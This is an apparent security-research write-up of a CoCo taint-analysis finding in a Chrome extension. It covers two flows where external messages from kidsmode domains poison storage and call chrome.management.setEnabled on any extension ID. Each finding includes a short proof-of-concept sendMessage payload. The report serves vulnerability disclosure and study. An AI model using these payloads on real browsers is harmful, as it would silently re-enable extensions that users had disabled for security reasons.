# CoCo Analysis: jppmckhklngonkgobpnncpgbmbbgfmik

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jppmckhklngonkgobpnncpgbmbbgfmik/opgen_generated_files/bg.js
Line 976: setExtension(message.id, sendResponse);
```

**Code:**

```javascript
// Background script - Lines 965-977
chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
  // ... other handlers ...
  if (message.type === 'set-monitoring') {
    setExtension(message.id, sendResponse);  // ← attacker-controlled message.id
    return true;
  }
});

// Lines 1101-1109
function setExtension(extensionId, callback = null) {
  chrome.storage.local.set({ monitoredExtension: extensionId });  // ← stores attacker-controlled ID

  if (callback) {
    callback({status: 'success', message: 'Monitored extension set.'});
  }

  return true;
}
```

**Manifest configuration:**
```json
{
  "permissions": ["management", "storage"],
  "externally_connectable": {
    "matches": [
      "*://*.kidsmode.me/*",
      "*://*.kidsmode.app/*",
      "*://*.kidsmode.site/*"
    ]
  }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain (kidsmode.me/app/site)

**Attack:**

```javascript
// From https://www.kidsmode.me/ (or .app or .site)
chrome.runtime.sendMessage(
  "jppmckhklngonkgobpnncpgbmbbgfmik",  // extension ID
  {
    type: "set-monitoring",
    id: "malicious_extension_id_here"
  },
  function(response) {
    console.log("Storage poisoned:", response);
  }
);
```

**Impact:** Attacker from whitelisted domains can poison the extension's storage by setting an arbitrary extension ID to be monitored. While storage poisoning alone has limited impact, this demonstrates attacker control over internal extension state.

---

## Sink 2: bg_chrome_runtime_MessageExternal → management_setEnabled_id

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jppmckhklngonkgobpnncpgbmbbgfmik/opgen_generated_files/bg.js
Line 976: setExtension(message.id, sendResponse);
Line 983: enable(message.id);
```

**Code:**

```javascript
// Background script - Lines 965-985
chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
  // ... other handlers ...
  if (message.type === 'do-enable') {
    enable(message.id);  // ← attacker-controlled message.id
    sendResponse({status: 'success', message: 'Triggered'});
    return true;
  }
});

// Lines 1242-1252
function enable(extensionId) {
  chrome.management.setEnabled(extensionId, true, () => {  // ← enables arbitrary extension
    if (chrome.runtime.lastError) {
      canNotEnable(extensionId);
    } else {
      chrome.storage.local.set({ reEnableCount: 0 });
      chrome.storage.local.set({ stopReoffer: false });
    }
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain (kidsmode.me/app/site)

**Attack:**

```javascript
// From https://www.kidsmode.me/ (or .app or .site)
chrome.runtime.sendMessage(
  "jppmckhklngonkgobpnncpgbmbbgfmik",  // extension ID
  {
    type: "do-enable",
    id: "target_extension_id_to_enable"
  },
  function(response) {
    console.log("Extension enabled:", response);
  }
);
```

**Impact:** Critical vulnerability - attacker from whitelisted domains (kidsmode.me, kidsmode.app, kidsmode.site) can enable ANY Chrome extension on the user's browser without user consent. This could be used to:
1. Enable previously disabled malicious extensions
2. Enable extensions that were disabled by the user for security/privacy reasons
3. Enable extensions that modify browser behavior in ways the user doesn't want
4. Bypass user's security preferences by re-enabling extensions that were intentionally disabled

Per methodology: "Even if only ONE domain is whitelisted, treat as TRUE POSITIVE if the flow is exploitable." The extension management permission combined with external control creates a serious security vulnerability.
